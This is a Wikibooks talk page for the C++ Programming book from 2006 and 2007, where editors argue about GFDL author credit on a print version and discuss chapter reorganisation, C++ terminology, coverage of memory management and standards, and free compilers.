This particular print version doesn't do that, but instead will print out with the titles of the actual book here on wikibooks, and will include both a link to the original pages and a reference to the last time it was edited (thus allowing any interested party to look up the diff in the contribution history). 

The whole point of the GFDL is to make things &quot;publishable by anyone&quot;, and for small print runs, it's essentially the same as Public Domain (unless you print a modified version)...you just have to include a copy of the GFDL licence, which this document does. 

I think what you're confused about here is the difference between authorship and copyright ownership. The copyright to this book is actually held by the Free Software Foundation, not wikimedia, wikibooks, or any particular wikibookian. If your concern is to make sure you're listed as an author somewhere (which only seems fair), you could create an &quot;authors page&quot;. However, you should again bear in mind that there is no policy on wikibooks (or in the GFDL) about who is listed on these pages. Derbeth, Guanaco or Whiteknight might be able to make a bot for counting up edits across the book and come up with the top 5 if that would help. But as far as this print version being a copyvio, it's not. If it would make you more comfortable, why not just make the authors page, come up with your best estimation of the top 5 contributors, and simply transclude it on this page when you're done? --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 16:45, 22 October 2006 (UTC)

I think I made it clear that it was about that list I was talking about (as it is stated in the first post) the authors page does exist. ( http://en.wikibooks.org/wiki/C%2B%2B_Programming/Foreword )

Nope I did not confuse authorship whit copyright ownership, I'm the author I have the copyright of my work witch I chose to license under the GFDL here at Wikibooks. Author is defined in copyright law and is not the subject of this particular discussion.
Wikibooks is the publisher of the work.

Even more complex here is that this is clearly a &quot;modified version&quot;, since it does reduces the content of the hole work without creating a fork since the content is virtually aggregated in &quot;real time&quot; to form the &quot;modified version&quot; and intended to produce a copy outside of wikibooks. But also this is not the point here.

What I requested is listed on the first post, it will not only protect my work but others that contributed to it, this is the spirit of the GFDL to protect the work and the authors and as you said to make things &quot;publishable by anyone&quot;, but the particular authors list is protected under the GFDL and the wikibooks copyright policy, hence the need to include reference to books, other authors and wikipedia on the final book. 

As I have said above it nearly the same as not providing a full copy of the GFDL on the generated print version.--[[User:Panic2k4|Panic]] 17:50, 22 October 2006 (UTC)

----

I see. It's a bit hazy though whether this is a modification of a single document, or a collection of documents (see 6. COLLECTIONS OF DOCUMENTS). I'm relatively sure that it's actually the latter (a collection), or certainly could be interpreted that way (in fact the GFDL is in the process of being changed in regards to wikis, and this is one of the reasons). 

It's not copyvio. It '''''is''''' a wiki however, so you're welcome to add that page to the print version if you like. Darklama, who works on the book, is also welcome to edit that page and add his name. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 18:26, 22 October 2006 (UTC)

That is not what is under dispute here, but at this time I object on considering Darklama a book author (as per the legal definition of author).--[[User:Panic2k4|Panic]] 18:43, 22 October 2006 (UTC)

You just agreed it could be, (even if you weren't shure), and I it clearly violates the policy...--[[User:Panic2k4|Panic]] 22:30, 22 October 2006 (UTC)

Panic, if your interpretation were true, then the entire book would be a copyvio because it (a) used materials from other books that were merged in, even though the whole books weren't merged in, and (b) because a lot of other pages, templates, etc. were removed, therefore the book itself is an excerpt from a larger book. 

Stop screwing around, stop trolling Darklama, and stop adding copyvio tags when there's no copyvio. If you're blocked, you'll have no say at all in what's done to the book, and if you continually put yourself in the way of the core principle of &quot;anyone can edit&quot;, you ''will'' end up being blocked. This is really counterproductive to the mission of wikibooks, so if you can't work with others, then you really have to rethink writing on this particular platform which was created with the intent of allowing '''''collaborative efforts''''' to create textbooks. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 22:52, 22 October 2006 (UTC)

Yup the book is a derived work from other peoples contributions.

I'm not &quot;screwing around&quot; not even trolling Darklama, and I will take this problem to other instances since this is a core subject that needs clarification it is of the same importance as removing the GFDL full copy from a print version.

This problem doe not infringe on &quot;anyone can edit&quot; but its a single and simple case of the letter of the license and active policies at wikibooks. And I disagree on it being considered &quot;counterproductive to the mission of wikibooks&quot;.--[[User:Panic2k4|Panic]] 23:19, 22 October 2006 (UTC)

You're screwing around with copyright law as a means of &quot;defending&quot; &quot;your&quot; book. You have continually gone out of your way to prevent Darklama from editing, and you're adding a copvio tag to make a point, because I find it difficult to believe that you actually think this is really a copyright violation. 

I would be more than happy to step out and let another mediator work with you, but please be clear that using this tag the way you are using it is unacceptable, and will not be tolerated. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 23:31, 22 October 2006 (UTC)

----

I don't consider it &quot;my&quot; book and haven't taken any action, not a single revert to any of Darklama contributions to the work, and this doesn't have any thing to do with Darklama other edits. This has to do with the general broad (and in my view abusive) interpretation given to the GFDL and copyright law by a great number of users on Wikibooks.

I really think that it breaks the copyright policy and the GFDL license I would not have taken the time to point it out otherwise.--[[User:Panic2k4|Panic]] 23:42, 22 October 2006 (UTC)

:Would it make you feel better if [[Template:Excerpt_collection_print_version_notice|this template]] was used instead? Keep in mind that every individual chapter of this book is a GFDL document, and can be printed without the rest of the book. The &quot;print version&quot; here is in that sense a collection of GFDL documents. If you copied and pasted the whole book onto one page, it would be one document, but it would also be a copyvio if the page histories were not also merged. This page, however, is nothing but a bunch of templates that transclude a bunch of GFDL documents: IOW a collection of GFDL documents. 

:The only time a wikibooks module can be a copyvio from another wikibooks module is if it is copied and pasted wholesale without either the history of the original or at the very least a link to the original (which might be done for forking purposes). --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 00:12, 23 October 2006 (UTC)

I'm sorry to say that you seem not to understand what my intentions are, I wish that the policy and the GFDL on this specific point be used and to form a base for any such disputes as I said above there was once a dispute about including the FULL GFDL on print versions and that was enforced the authors list is requires on any hardcopy of a book also (that is my point), I've now sent an [[User talk:Panic2k4/EFFLetter|e-mail to the EFF and a fax to Jimmy Wales]] if I'm proven wrong on this topic at least it will make things clear not only to me but to the community, since I disagree also with other points like the definition of author used by some users that doesn't seem to comply with the law.

A major problem is that such policies or interpretations can't fallow the standard adoption guidelines they are ABSOLUTE and should not be given to wide interpretations (a contributor to a book may not be an author under the law there are degrees as I've stated earlier, but that in not the point on this specific discussion, but we as a community must address this problem ASAP since many contributors seem to have another interpretation of it).--[[User:Panic2k4|Panic]] 00:56, 23 October 2006 (UTC)

== Book Reorganization ==
There seems to be a few remaining issues with some chapters overlaping one another that I think should be addressed.

*There are multiple chapters that try to do an overview of basic programming related concepts, that I think should be merged into one chapter, after some editing to cut down on details. I think instead of giving too much details the chapter could also act as a guide to where more details on the relevant information can be found in the book. The chapters are:

# Introduction
# What is a programming language?
# What is a program?
# Understanding the Source Files
# Programming Paradigms

The new chapter could cover the history of programming briefly leading up to the creation of C++, somewhat expanding on whats already in Introduction and possibly explaining the rest of the concepts in terms of when they were introduced. This chapter could then end with a summary of basic C++ programming concepts that are explained fully in later chapters along with what those chapter names are as wiki links. This chapter would be for readers not familar with C++'s history or with the most basic programming terms and concepts.

*There is some overlap between what are variables and what are operators that needs to be addressed as well as two chapters on operators that should be merged. There is also the statements chapter which I think should be part of whatever chapter describes these concepts. This chapter would also describe chaining operators together and how C++ evaluates expressions. My idea is to have one chapter that talks about statements, expressions and operators. This would probably require rewriting the chapter once merged together. Arrays should be be part of the chapter on variables because arrays are out of place anywhere else. References and pointers I think should either be in the chapter on variables or described in a chapter on memory management. The varies operators used for arrays, references, pointers I think should only be described in terms of their binding order in whatever chapter describes expressions, states and operators instead of fully explaining what arrays, references and pointers are as seems to be the purpose now.

*There should be a chapter on memory management which discusses using new, new[], delete and delete[] operators and describes basic concepts of how memory works. Since references and pointers are typically related to memory this may also be a better place to discuss them in detail rather then a chapter on operators where I think they are a bit out of place. This would also involve merging the contents of &quot;Internal storage of data types&quot; into this new chapter.

*The two chapters &quot;Abstract classes&quot; and &quot;Pure abstract classes (abstract types)&quot; I think should be merged into the &quot;Polymorphism&quot; chapter, because abstraction is one of the key concepts of polymorphism and shouldn't be separated into different chapters.

I would be willing to try to do all this if there's no objections. I think all these changes would improve this book a lot and then I should be able to concentrate more on correcting errors and expanding on concepts. --[[User:Darklama|darklama]] 20:01, 7 November 2006 (UTC)
----

If you intention is extend The Introduction chapter, clean it up and move parts to a sub chapter that would cover the history of programming languages and C++ in particular, that I think is a fantastic idea.

As for moving the *The two chapters &quot;Abstract classes&quot; and &quot;Pure abstract classes (abstract types)&quot;, this are C++ topic that must be easy to find and read for a users and Polymorphism is a concept that can be learned or skipped as it is independent of the only C++ content and should be introduced in Programming Paradigms under the OOP information.--[[User:Panic2k4|Panic]] 01:08, 13 November 2006 (UTC)

----

No my intention is to combine &quot;Introduction&quot;, &quot;What is a programming language?&quot;, &quot;What is a program?&quot;, &quot;Understanding the Source Files&quot; and &quot;Programming Paradigms&quot; into one chapter and clean it up. Whether its split up into sub chapters or not depends on the results after the merging, cleanup and extending happens.

As for the &quot;Abstract class&quot; and &quot;Pure abstract classes (abstract types)&quot; bits being combined with Polymorphism being hard to find. Part of the reorginization plan with the above combined chapter is to describe what each chapter covers in more detail then whats provided in the table of contents description, as is sometimes found in the first chapter of a book. This should make it very easy to find what a reader is looking for.

To give an example:

;[[C++ Programming/Variables|Variables]] : Variables store or hold information that a program needs to know about. This chapter covers the concept of variables in more detail along with the various kinds of variables you need to know about.

...but the information for the chapters would be a bit longer than that.

This first chapter would become a quick walkthrough of important Historical events that lead to the creation of the C++ Programming language and then what new concepts C++ introduced. Along with explaining what a programming language is and what events lead to the concepts of divided a program up into logical units such as source files. This would also effectively cover different programming paradigms from there historical 	significance. Followed lastly by what this book covers and how the chapters are layed out. Whether this ends up being a single page or spreed out over multiple pages depends on how big it becomes. All I got to say is we should start with just one page and go from there. If it needs to be split up over multiple pages so be it, but transclude all the subchapters into a chapter page for those readers who wish to read it all at once. 
This was my motivation for trasncluding those chapters into one, to begin this process. Really it needed to be copy and pasted into one chapter rather then trasncluded, but I was trying to start off slow for you. I really rather see the first chapter be an overview chapter and leave later chapters as &quot;closer look&quot; at what was just covered in the first chapter, then readers who need or want to know can read the first chapter and those readers who want to dive right in can skip ahead without losing out on any important information. I believe this is what you want too, even if we don't exactly agree with how much or how little information should be given. If you can agree that certain stuff like how C++ implements data abstraction is held off until later chapters like Polymorphism with this reorganization then all the better. The first chapter becomes an overview what it is all about, and the later chapters the why and how. --[[User:Darklama|darklama]] 02:41, 13 November 2006 (UTC)
----

I don't see a need in reducing the books parts (unless it has some duplicated content) as for merging &quot;Introduction&quot;, &quot;What is a programming language?&quot;, &quot;What is a program?&quot;, &quot;Understanding the Source Files&quot; and &quot;Programming Paradigms&quot; into one chapter (if you mean more that under the single section), I don't like the idea as the subjects are independent of each other and &quot;Understanding the Source Files&quot; is the only one that deals directly with C++ concepts, if the intention was to set them on the same section/chapter what would you name it? (ultra-basic ?), the only problem with that is &quot;Understanding the Source Files&quot; doesn't belong on the same section. --[[User:Panic2k4|Panic]] 17:15, 13 November 2006 (UTC)

----

Well I think those parts need to be cleaned up a lot and tied together as one chapter. My idea to try to take a slightly different approach to the topics covered in those pages so that it is easier to follow and understand and those who know already something about it can skip ahead. Source files are not concepts strictly new to C++. My intention is to set them up as part of the same chapter and the name could be Introduction. To give a general idea of what could happen if it gets long enough after merging and cleaning it all up is:

&lt;pre&gt;
Introduction (actual chapter name, transclusion of all subpages)
 Introduction/History (includes history of OOP, procederal programming, structural programming, early history of C++, etc.)
 Introduction/About (description of what this book covers, description of what each chapter covers)
&lt;/pre&gt;

It would be basically like what you did to Inheritance and Polymorphism in a way in which you made them subpages of the Class chapter. The only difference is they would be one page for now while I cleaned it all up, possibly make major changes to it and expand on it. Its a bit hard to explain it without doing it. Think of a &quot;dead tree&quot; book, books have chapters in them that try to be self contained, generally with the exception of the first chapter which covers what the book is about, who is meant to read the book, possibly a bit of a history of the topic and sometimes a overview of what the chapters contain so readers can skip to the chapter they are most interested in. If you look even at other well-written wikibooks that have a big contribution base they follow the same guiding principals as a &quot;dead tree&quot; book.

These last steps that I proposed are what I think are the finishing touches of my &quot;this doesn't flow very well, needs more flow to it&quot; theme that I've been raving about. I think its truly needed to turn a major tide of the book from &quot;difficult to read&quot; to &quot;easy to read&quot; and I think everything else I've worked on so far has been working up to this. I think your decision to hold off on discussion of my other suggested until this is completed is a good idea. I think this major change is a must. Oh and I'm not trying to reduce the contents with this move, just trying to get it in better shape, in the contrary I think it will actually end up increasing the size of the contents of this book.

To give you some more example here's a generalized approach I have in mind:

In &lt;year&gt;, &lt;creator&gt; introduced &lt;language&gt; which contained variables that allowed programmers to store information temporarily in memory, the idea is said to have been borrowed from algebra and in the early days of programming only single letters were allowed to be used to present numbers.

In &lt;year&gt;, &lt;creator&gt; introduced functions with his/her creation of the &lt;language&gt; programming language...This was the beginning of functional programming.

Maybe that will give you an idea of how I plan to combine it all together into one chapter. Right now sure it may not make since, but thats part of the reorganization and clean up process I have in mind. :) --[[User:Darklama|darklama]] 18:36, 13 November 2006 (UTC)
----

Well in the part of extending the introduction and adding more history we are in agreement, please don't remove the Wikipedia links, if possible link to this book if a section exists (or if it should exist, leave the link to Wikipedia), if it shouldn't and another Wikibook has the information use Wikibooks as the reference. Ok this will get you go ahead with the work.

As for the section name moving all under an introduction chapter seems acceptable but remember that as I said &quot;Understanding the Source Files&quot; is not generic like the others it introduces the idea of C++ file extension (with limitation on the OS) and naming conventions that are not and should not be part of the style conventions. --[[User:Panic2k4|Panic]] 18:49, 13 November 2006 (UTC)

----

Well perhaps then the Understanding Source files page needs to be split up into seperate parts, with the parts that deal with understanding source files being within this new introductory chapter and the bits about file extensions and naming conventions in some sort of guide to getting and setting up a compiler. Of course I think such a chapter would need to be general enough and not cover how to do every little thing in the compiler. Just how &quot;do I compile this thing?&quot; basically. --[[User:Darklama|darklama]] 19:10, 13 November 2006 (UTC)

----

Ok well talk about that when you get to that part (Understanding Source files), a introductions to the OS would be welcomed and the file extension/names part could be used there. Humm the Hello World example has a little introduction on how to use GCC a more complete one is still missing. A introduction to Make tools is also missing.

As for what a compiler is and how to use (in general) should be kept separated, but all the information would be welcomed. You probably can't write a &quot;how do I compile this thing?&quot; with general orientations in several compilers without needing to introduce more evolved concepts, it can only be done in simple and basic examples (like it is done in the hello world)--[[User:Panic2k4|Panic]] 17:07, 20 November 2006 (UTC)

----

Actually the simple and basic examples like is used in the hello world page is what I had in mind for any chapter on getting a program compiled and any naming conventions with maybe a note template added to suggest readers read their compiler documentations and maybe also refer readers to the weblinks page in the book for any online documentation that may be available or tutorials or other wikibooks that might be helpful. Something like a 1 to 5 minute guide to compiling with g++, visual studios, etc. is all I had in mind. I don't think we need to cover Make tools, I believe there is already a wikibook that covers Make tools and other common tools found in a Linux/BSD environment. Anyways I guess I can just get started and whatever isn't needed any more from Understanding Source files can be deleted and we can deal with whatever is left of it then. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 17:48, 20 November 2006 (UTC)

==#warning Directive==
Could someone explain a bit about where this directive is documented?  I can find it in the [http://gcc.gnu.org/onlinedocs/cpp/Diagnostics.html CPP Manual], but how widely is it accepted?  I notice that Visual Studio 2005 does not accept it as a valid directive.  How about some of the other major compilers?  Is it part of a recent standard in either C or C++?

----
Panic (or anyone else): if there is a specific change that you object to, please state why, and what the objection is.  I don't see any examples above.  If I do make an error (for example, write something that is nonsensical), I'm happy to have it pointed out.  But please, do make specific points.  I try to note when I'm correcting specific errors.  For example, many people are confused because they don't understand the difference between the parameters (aka formal arguments) that appear in a function declaration and the actual arguments that are passed to it; understanding that distinction removes many other confusions.

The C++ standard is one source of the term &quot;parameter&quot; for this use (see e.g., [dcl.fct.def], preferring mnemonic references while the standard is being revised).  [expr.call] uses the term &quot;arguments&quot; for the expressions used in a function call expression.  Sticking to the terminology used by the C++ standard, where possible, ensures consistency and helps people to adapt to C++ instead of being confused by more general Computer Science terminology or terms from other languages.

&quot;Methods&quot; certainly are significant in Smalltalk, but don't correspond exactly to C++'s member functions.  A Smalltalk method is the piece of code invoked as a result of message passing.  Smalltalk doesn't have non-virtual methods, and indeed its dispatch mechanism is much more flexible than that of C++.  (Smalltalk doesn't use the term virtual, of course, nor does it need to.  All dispatch uses late binding in Smalltalk.)  C++ has member functions, data members (aka member variables, including static and non-static member variables), member templates, and so on.  Indeed, the section of the standard introducing member functions is called &quot;Member Functions&quot; (mnemonic: &quot;class.mfct&quot;), and none of the 8 occurrences I find of the term &quot;method&quot; in the 2003 C++ standard uses the term in the sense of a kind of function.

Let's try to have a constructive discussion of how to present the material, and on the technical content.  Wiki works best when you assume other contributors have something worthwhile to offer, unless they show themselves unable to work constructively and cooperatively.  Throwing around terms like &quot;nonsensical&quot; and mentioning the possibility of reverting material should be a last resort.  But please, do give specific criticism of anything you think is wrong.  Here, if others may be interested, or on my talk page, if you think it likely not of interest elsewhere. -- [[User:James Dennett|James Dennett]] 05:45, 9 December 2006 (UTC)

OK, having looked at this module, I don't see any examples of nonsense caused by what I've written there, though I've fixed up a few more pieces of it (such as something that still confused an array with a pointer).  So, specific notes of problems would be appreciated, if people find problems.  Thanks! -- [[User:James Dennett|James Dennett]]

Since [[User:James Dennett|James Dennett]] has [[User_talk:James_Dennett|no time to alter his changes or debate the issue]], I've corrected the conflicts I could find, [[User:James Dennett|James Dennett]] makes a good point (I must confess that I have the updated C++ Standard but use it only for consultation) I didn't read it from cover to cover, but his point in the nomenclature used should be fallowed...

I will start changing:
methods to member functions
functions arguments to function parameters

And will try to find a way of introducing this concepts at the beginning since I agree that &quot;Sticking to the terminology used by the C++ standard, where possible, ensures consistency and helps people to adapt to C++ instead of being confused by more general Computer Science terminology or terms from other languages.&quot; --[[User:Panic2k4|Panic]] 21:11, 9 December 2006 (UTC)

I've changes all references to methods to member functions, txs to [[User:Darklama|Darklama]] for spotting some mistakes, another point that should be checked is the distinction of  parameters (aka formal arguments) vs arguments that [[User:James Dennett|James Dennett]] pointed out.--[[User:Panic2k4|Panic]] 02:49, 10 December 2006 (UTC)

== Scope, Standards and Sequence ==

It seems clear that we want to mostly focus on standard C++, currently meaning C++ as specified in ISO/IEC 14882:2003.  However, as I come to write some more material on memory management, it's very tempting to include some material on shared_ptr, either as boost::shared_ptr, as std::tr1::shared_ptr (from TR1), or as std::shared_ptr (as is likely to be in C++0x).  If we choose to cover material that's not in the 2003 standard, we should at the very least be careful to make it clear that it is not yet standard.  The bigger question is: to what extent, if any, should we cover TR1 or C++0x material?  An argument could be made for having separate chapters for each of TR1 and C++0x, and then referring to them from other chapters as seems helpful, but I'm not sure that's the best approach.  Ideas/opinions? -- [[User:James Dennett|James Dennett]] 05:45, 12 December 2006 (UTC)

From previous discussions and from becoming more familar with attitudes on Wikibooks, I'm of the opinion that material that might be in a future standard of C++ shouldn't be covered until they become standard. There is probably very little way to cite references that something is going to be in the next standard, not to mention could be qualified as orginal research. We got a chapter on Boost however, so I think boost:shared_ptr would be best served by being covered in that chapter.

I'm of the opinion also that parts of the C++ standard that deals with the library should be covered in its own chapter and for the most part that seems to be the way its been going, as we have a chapter on String and a chapter on Streams. The memory chapter I think should deal with using new, new[], delete and delete[] since they are considered operators rather then part of the standard library. I also think it might make sense to have [[C++ Programming/Data Type Storage]] part of that chapter and to cover references and pointers there as well.

Ok one last point to make, is I think that each chapter should try not to refer to other chapters too much. As you probably can tell there are two different table of contents and print versions available. This reflects differences in view in what order different concepts should be learned. So each chapter should probably not make any assumptions about whats already been covered or not, in order to try to remain neutral in favoring one view over another. It also has the advantage of making no assumption that on what readers have or haven't read yet.

To summarize my opinion:
* Future Standards shouldn't be covered until they are accepted as current standards.
* Standard C++ should be covered separately from the standard C++ library.
* Each chapter should more or less stand alone and not assume other chapters have been read first.

That position on standards is reasonable (material on C++'s TR1, which has been published, might usefully be covered in a separate book).

As for having a section on memory management that doesn't document that RAII is the canonical C++ approach, with references to ready-made memory management classes, I'd be opposed to it.  I do agree that covering the lower-level facilities should be done, but too many sources cover them without noting the better tools that exist for most uses.  This does get into issues about neutrality, but a book on programming should try to mention best practices, which is non-neutral.

Incidentally, new/delete etc. are interesting in that they are part of the intersection of language and library: they are language features that rely on library features, and can be affected by user-defined replacements for operator new etc.  It's not entirely possible to cover language and library separately -- nor, in my opinion, is it desirable.  Separation should be based on subjects according to what they achieve, not implementation details.

It might be worth having a hierarchy: have a Memory Management chapter with an overview, a section on manual memory management, and a section on RAII.  I'd have to think about a good way to organize that.  Then again, that's pretty much the angle I was coming from already, and you seem uncomfortable at covering both manual memory management and automation of memory management in the same chapter.

-- [[User:James Dennett|James Dennett]] 00:31, 13 December 2006 (UTC)

You're somewhat correct. It's not so much uncomfortable with the idea of having manual and automation of memory management in the same chapter, as I do with the POV that automation of memory management is the way to go. I think the chapter's main focus should be on how a programmer can allocate and deallocate memory and gives tips on how to make it easier to do so, through the use of class constructors and destructions to minimize the need to keep track of it oneself and near the end possibly mention things like garbage collection, using tools that help to debug memory leaks, and using automated tools.

I agree there is no real way to separate memory management as provided by the language itself and provided through the standard library. I don't have much of an issue with combining that information in some chapter since it makes sense. Referring to memory management in other chapters is probably not a good idea though and that was mainly what I was referring to. That and suggesting discussing the boost memory management in that chapter, since it already has a chapter and isn't really part of the standard.

I see this book as being divided into three parts:
* the first part teaches how to use C++ as defined by the current standard.
* the second part teaches about the use of the C++ library as defined by the current standard.
* the third part descriptions any non standard extentions and any additional libraries that might be useful.

To sort of tie the first and second parts together I think the memory management chapter falls as the dividing point, since its a little bit of both. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 00:55, 13 December 2006 (UTC)

: Interesting; I think your last point exposes the core issue here.  C++ can be taught bottom-up (in which case you'd want to cover the &quot;language&quot; aspects before the &quot;library&quot; aspects) or top-down (in which case you'd introduce some of the key pieces of the standard library from the very beginning).  Originally pretty much all C++ texts were bottom-up, and that has caused many problems.  More recently the best C++ texts have been top-down, and that's an approach I'd prefer if we can find a way to make it work.  Is it fair to say that your preference is for what I'm calling a bottom-up approach?  (Would you have a better term for it?) -- [[User:James Dennett|James Dennett]] 04:46, 13 December 2006 (UTC)

:: This isn't really my approach, rather how it already was before I started contributing. I don't really have much preference on it, but I do agree the approach this book uses does seem to not work too well. The only preference I really have is based on my own preferences in programming books which are ones that can be used both for reading from cover to cover to learn from and can be used later on as a quick reference. This usually means that each chapter is relatively independent of the others, and cases where it is not, it gives an exact reference to the page and section title to make locating the information a breeze and it contains appendexes in the back, which in the example of C++, has all the keywords, library functions, classes, etc that are available to a C++ programmer. I also believe in teaching good habits like not assuming just because X works in compiler Z that its going to work everywhere if its not standard, by not discussing non-standard things until later on the book when everything that is standard has already been covered. Using this method I believe removes clutter from books, since it can focus on just one core concept at a time.

:: So if your willing to help take this book into a completely different direction and have a lot of time on your hands to do so, then I'm all for it. The reason I say if you got the time, is I hate to see it only get half done, it would be better to try to make the current approach work if you don't have time to invest in making some other approach work. In some ways my attempts to change the first chapter may reflect inversing the book from a bottom-up approach to a top-down approach, so we may not be as far off in our thinking. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 05:34, 13 December 2006 (UTC)

:: Another way may be to take it one step at a time, working from the first chapter then moving onto the second chapter, etc. That way may allow for slow adjustments over a longer period of time without the issue of looking inconsistent. I've been working on trying to provide more consistency to the book without trying to change its approach too much, since it doesn't require as much time investment to do so as changing its approach would require. That is really my only concern with changing it from bottom-up to top-down, causing inconsistencies that in the time may make it hard to use for reading. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 15:38, 13 December 2006 (UTC)

Should we just redirect the users to [[w:Revision Control]], copy it across and hack and slash at it or write it all ourselves? --[[User:Rmccue|Rmccue]] 10:07, 14 December 2006 (UTC)

Redirecting to a Wikipedia article is always a bad idea. I'm in favor of describing what Source Control is and how its useful to a C++ programmer briefly and directing readers to other Wikibooks for additional information in a slightly broader and more general chapter on Tools that are useful to C++ programmers, such as IDEs, Debuggers, Profilers and Source Control programs. If your interested in basing a page on contents from Wikipedia there is a process for [[WB:RFI|requesting an articles for import]] from Wikipedia in order to preserve the edit history and increase compliance with the GFDL. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 14:16, 14 December 2006 (UTC)

: The best way to go about it [[User:Rmccue]] is to copy it to your sandbox in your userspace here at Wikibooks hack it there and then move it to the book (do try to give it a twist so that only C++ related concepts remain), if you need any help on the hacking :) say so and I will do what I can. There is no major change to do in the book as rights are concerned as Wikipedia is already given credit as a source. --[[User:Panic2k4|Panic]] 17:48, 3 January 2007 (UTC)

== Free compiler ==
A major facilitator to learning a computer language is the chance to experiment by writing simple and not so simple programs. There are several free C++ compilers available on the web - I know of two, the GNU compiler and a compiler made available by Borland. Unfortunately the GNU entry is completely hopeless for use by a beginner. There seems to be thousands of libraries, for instance, without any guidance for what is needed to get started, or how to set it up. 

The Borland contribution is much more modest and hence looks more promising at first glance. But here too, I have stumbled with the question how to get started. For instance, one simple question which eluded the documentation writers was what directory a user should use for his source code. In fact, I was never able to get to the point of generating &quot;Hello World&quot; with this compiler, (although I dare say, if I ever did get there, there would be no stopping me).

Maybe it was never the intention of this initiative to make up for the failings of compiler documation. Still, I for one would greatly appreciate someone taking the problem in hand, and I believe it would honestly contribute greatly to helping self learners make progress with C++.

--[[User:Philopedia|Philopedia]] 02:28, 7 January 2007 (UTC)
----

There is already a list of free compilers on the book and the final choice is always based on the users tastes or background experience, I personally don't particularly like new Borlands products for many reasons, the GCC or GNU compiler is one of the most common first start choice but at the moment and due to other factors I personally like the MS 8.0+ version of the compiler it goes by the standard (it still has some bugs but you can get another implementation of the STL if they get in you way) and you get a perfectly good IDE for free (See the link section for the Express Edition link, it is free), if you chose to use the GNU Compiler try Anjunta or Code::Blocks or even Ultimate++, but this all depends of what you like, one thing to be said of the MS Compiler and IDE is that the debug reports are the most useful I have seen and you get a good set of debug tools on the package, they are free but not opensource and only run on Windows (Visual Studio can run on Linux under Wine to but it may be a bit overcomplicated and should only be done with a good reason) and you can download or access MSDN documentation for free to, btw if you are learning and chose the MS solution stay away from the wizards until you know how to do the same by yourself, hope I have helped. --[[User:Panic2k4|Panic]] 03:00, 7 January 2007 (UTC)

Merging into the book should be initiate ASAP, provide a stand alone TOC to the exercises, extract the completed examples and add them to the proper subject matter, also indexing them as examples and complete all examples extraction from C++ Programming and provide a example TOC (not exercises but only with the example source codes)--[[User:Panic2k4|Panic]] 22:11, 20 October 2006 (UTC)

What do you have in mind for orginizing it into the book?

Yup, but using transclusion and posting the examples in the proper chapter under exercises (see variables/exercise) this will make it easier in the future to check all the code and add boxes.--[[User:Panic2k4|Panic]] 23:13, 20 October 2006 (UTC)

Transclusion to where? I'm against transinclude the exercises into the chapters, they should be there own seperate part only placed in whole book view after the chapter, if you want to have it orginized that way. --[[User:Darklama|darklama]] 23:33, 20 October 2006 (UTC)

Ok just to go ahead with this, do you agree to move the book to a Chapter Exercises at the end of the actual book, humm, maybe after the STL and before Beyond the Standard ?, Or a Volume if you are adamant in preserving it's structure after the Appendixes (will have to rename the first Volume I, (preserve the visualization and add it to the Volume Title and next to the whole book view) don't add to the whole book view and add a note on that. We can then decide how to organize it, this will preserve it's structure as is and enable us to link to sections of it) I think at the end of each chapter adding an exercise list (related to it) would be productive.--[[User:Panic2k4|Panic]] 05:32, 30 October 2006 (UTC)

----

